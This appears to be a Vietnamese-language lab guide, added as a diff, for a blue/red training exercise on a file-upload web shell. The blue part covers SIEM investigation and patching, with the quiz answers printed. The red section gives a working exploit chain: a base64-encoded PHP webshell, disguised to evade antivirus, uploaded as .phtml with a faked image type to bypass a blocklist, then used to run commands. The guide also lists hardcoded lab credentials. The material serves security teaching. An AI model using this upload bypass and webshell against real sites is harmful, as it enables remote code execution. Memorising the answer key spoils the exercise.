@@ -1,0 +1,125 @@
+========================================================================
+  BAI 7 - WEB SHELL -> RCE: DIEU TRA (FIM) + VA + KHAI THAC (Cong ty X)
+========================================================================
+
+Day la bai HYBRID: ban vua lam BLUE (phong thu he A) vua lam RED (tan cong he B).
+
+ * BLUE - he A (172.20.0.10, "PhotoBox" - dich vu tai anh dai dien):
+     Mot ke tan cong (an) dang LIEN TUC upload webshell va da RCE duoc. Nhiem vu:
+     DIEU TRA qua SIEM (FIM + access.log) -> GHI PHIEU -> VA GOC lo hong upload ->
+     DON sach webshell -> GIU dich vu tai anh hop le van chay (SLA).
+
+ * RED - he B (172.20.0.40, ban sao CHUA va, chi HTTP):
+     Ban TU khai thac dung chuoi tan cong do -> doc FLAG ca nhan hoa -> NOP qua
+     /submit.php de chung minh da hieu lo hong.
+
+Duong ong THAT: attacker -> he A (access.log + FIM) -> agent Wazuh -> dashboard.
+
+!!! LAN DAU: siem can ~8-10' de cai xong Wazuh. Neu dashboard chua vao duoc,
+    doi them vai phut (tren siem:  tail -f /var/log/wazuh-install.log).
+
+------------------------------------------------------------------------
+0) DIA CHI & HAI VAI
+------------------------------------------------------------------------
+  (Tren defender da co san file ~/muc-tieu.txt ghi lai cac dia chi nay.)
+  - Dashboard SIEM:  https://172.20.0.20
+        Dang nhap: admin / Q*uJjovx2guqFRqntC568k?lf3evm.jl
+        (mat khau admin CO DINH baked trong anh chung soc-wazuh - giong het Bai 1-3.
+         Neu ai TU build lai anh chung bang make-soc-wazuh.sh <pw> thi dung <pw> do.)
+  - He A (BLUE - va tai day):   ssh analyst@172.20.0.10     (mat khau: analyst)
+        ma nguon web: /var/www/html   (index.php, upload.php, uploads/)
+  - He B (RED - khai thac):     http://172.20.0.40          (chi HTTP, khong co shell)
+        nop flag: http://172.20.0.40/submit.php?flag=FLAG-xxxxxx
+
+------------------------------------------------------------------------
+1) DIEU TRA (BLUE) - GHI PHIEU (tren he A)
+------------------------------------------------------------------------
+File khung ~/dieu-tra.txt DA CO SAN tren he A (5 dong D1=..D5= de trong).
+SSH sang va MO RA DIEN SO:  ssh analyst@172.20.0.10  ->  nano ~/dieu-tra.txt
+Tra loi 5 cau, GHI SO sau moi dau '=', moi cau 1 dong dang  Dx=<so>  :
+
+  D1. Octet cuoi IP ke tan cong? (access.log cua he A; dang 172.20.0.X -> ghi X)
+  D2. Ke tan cong dung ENDPOINT nao de UPLOAD?
+        1 = login.php    2 = upload.php    3 = index.php    4 = submit.php
+  D3. .php bi chan. Ke tan cong lach blocklist bang DUOI FILE nao (file that su RCE)?
+        1 = .jpg    2 = .php5    3 = .phtml    4 = .png
+  D4. File webshell nhan lenh thuc thi qua THAM SO URL nao? (mo chinh file webshell FIM bao)
+        1 = file    2 = cmd    3 = id    4 = q
+  D5. FIM (syscheck) canh bao file LA duoc THEM vao THU MUC nao?
+        1 = /etc    2 = /var/www/html/uploads    3 = /tmp    4 = /home/analyst
+
+  Vi du noi dung ~/dieu-tra.txt :
+      D1=5
+      D2=2
+      D3=3
+      D4=2
+      D5=2
+
+------------------------------------------------------------------------
+2) TIM O DAU (3 cap goi y)
+------------------------------------------------------------------------
+ Cap 1: Dashboard (Threat Hunting / Discover). Co 2 nguon quan trong:
+        - access.log (log_format apache): thay request upload + request goi webshell.
+        - FIM/syscheck: thay FILE MOI xuat hien trong thu muc bi giam sat.
+ Cap 2:
+   D1/D2: Trong access.log loc theo IP ke tan cong. Request upload co dang
+          "POST /<endpoint> ...". Tren he A:
+            sudo grep -E 'POST|uploads/' /var/log/apache2/access.log | tail
+   D3:    Dung tin "duoi nao RCE" chi vi ten. PHAI tuong quan: file nao vua duoc
+          UPLOAD (POST) VUA bi GOI lai kem '?cmd=' (GET uploads/<file>?cmd=...).
+          Duoi cua file do = dap an.
+   D4:    Mo chinh file webshell FIM bao (trong uploads/) va doc ma PHP:
+            sudo cat /var/www/html/uploads/<webshell>
+          Tim ten tham so trong $_REQUEST[...] hoac $_GET[...] -> do la tham so RCE.
+   D5:    Tren dashboard, cac canh bao FIM ('syscheck'/'File added') chi ra duong
+          dan file moi -> thu muc chua chung.
+ Cap 3 (dap an huong dan):
+   D1=5. D2=2 (upload.php). D3=3 (.phtml). D4=2 (cmd). D5=2 (/var/www/html/uploads).
+
+------------------------------------------------------------------------
+3) UNG PHO (BLUE) - VA GOC + DON SACH (tren he A, qua ssh analyst@172.20.0.10)
+------------------------------------------------------------------------
+  Ke tan cong cai lai webshell dinh ky. CAN va goc, dong thoi don sach:
+
+  a. VA GOC ham upload (sua /var/www/html/upload.php - analyst so huu, khong can sudo):
+       - Dung ALLOWLIST duoi anh (chi cho .jpg/.jpeg/.png/.gif) THAY VI blocklist, VA
+       - kiem noi dung that su la anh (getimagesize()).
+     HOAC chan thuc thi PHP trong uploads/ bang .htaccess:
+       cat > /var/www/html/uploads/.htaccess <<'EOF'
+       php_flag engine off
+       RemoveHandler .php .phtml .phar .pht
+       EOF
+  b. DON sach webshell con sot (ke ca file AN dang .phtml):
+       ls -la /var/www/html/uploads/
+       rm -f /var/www/html/uploads/<cac file .php .phtml .phar .pht>
+  c. GIU SLA: dich vu phai con tai duoc ANH HOP LE (.jpg). Dung va qua tay.
+
+  (prestop se tu test: upload .jpg hop le -> phai OK ; upload .phtml test -> phai
+   KHONG con thuc thi ; va kiem uploads/ con webshell khong.)
+
+------------------------------------------------------------------------
+4) KHAI THAC (RED) - LAY FLAG HE B (http://172.20.0.40)
+------------------------------------------------------------------------
+  He B la ban sao CHUA va. Tu tay di lai chuoi tan cong:
+    1. Mo http://172.20.0.40/ -> tim form upload (field 'avatar', action upload.php).
+    2. Thu .php -> bi chan. Lach bang .phtml. Tao mot webshell PHP TOI THIEU (mot the
+       PHP goi ham he thong tren tham so URL ten 'cmd'). De antivirus tren may that
+       khoi chan, chuoi payload duoi day duoc de DUOI DANG BASE64 - giai ma ra file:
+         echo 'PD9waHAgc3lzdGVtKCRfUkVRVUVTVFsnY21kJ10pOyA/Pg==' | base64 -d > shell.phtml
+       Upload:
+         curl -F "avatar=@shell.phtml;type=image/jpeg;filename=shell.phtml" http://172.20.0.40/upload.php
+       -> phan hoi in duong dan uploads/shell.phtml.
+    3. RCE + doc flag (tham so 'cmd'):
+         curl "http://172.20.0.40/uploads/shell.phtml?cmd=cat%20/var/lib/photobox/flag.txt"
+       -> ra 'FLAG-<so>' (MOI SV MOT SO KHAC NHAU).
+    4. NOP flag:
+         curl "http://172.20.0.40/submit.php?flag=FLAG-<so>"
+
+------------------------------------------------------------------------
+5) NOP BAI
+------------------------------------------------------------------------
+  checkwork  -> can dat CA 3:
+     * webshell_dieutra = Y  (dieu tra Blue dung >= 4/5 cau)
+     * blue_patched     = Y  (he A HET RCE + sach webshell + con SLA)
+     * red_flag         = Y  (lay duoc flag he B)
+  Xong: stoplab
